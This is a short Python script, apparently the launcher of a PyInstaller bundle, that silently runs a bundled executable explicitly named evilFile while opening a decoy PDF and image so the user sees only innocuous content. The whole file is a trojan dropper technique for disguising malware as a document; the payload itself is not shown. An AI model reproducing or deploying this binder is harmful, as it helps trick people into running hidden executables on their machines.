import os, sys, subprocess


def base_path(path):
    if getattr(sys, 'frozen', None):
        basedir = sys._MEIPASS
    else:
        basedir = os.path.dirname(__file__)
    return os.path.join(basedir, path)

evilFile = base_path('demo.exe')
normalFile = base_path('demo.pdf')
imageFile  = base_path('images\\image.jpg')

#subprocess.call(evilFile,shell=True)
subprocess.Popen(evilFile, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
subprocess.Popen(imageFile, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
subprocess.call(normalFile, shell=True)